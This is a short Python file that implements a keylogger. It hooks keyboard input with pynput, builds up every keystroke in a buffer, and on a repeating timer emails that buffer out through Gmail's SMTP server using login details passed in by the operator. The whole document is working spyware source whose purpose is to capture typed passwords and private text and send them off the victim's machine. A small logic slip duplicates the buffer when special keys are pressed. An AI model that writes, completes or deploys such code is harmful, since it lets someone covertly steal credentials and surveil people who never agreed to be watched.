import pynput.keyboard
import time
import threading
import smtplib
class Keylogger:
    def __init__(self,time,email,password):
        self.stored_keys = "keylogger started"
        self.time= time
        self.email=email
        self.password=password
    def log(self,string):
        self.stored_keys=self.stored_keys+string
    def key_press(self,key):
        #self.stored_keys

        try:
            # key.char-represents special keys like ctrl,space,etc
            current_key = str(key.char)
            # print(stored_keys)
        except AttributeError:
            if key == key.space:
                current_key =" "
                # print(stored_keys)
            else:
              current_key = self.stored_keys +" "+ str(key)+" "
                # print(stored_keys)
        self.log(current_key)
    def send_mail(self,email,password,message):
        server=smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()
    def report(self):
        self.send_mail(self.email,self.password,self.stored_keys)

        self.stored_keys = ""
        timer = threading.Timer(self.time,self.report)
        timer.start()
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.key_press)
        with keyboard_listener as listener:
            self.report()
            listener.join()






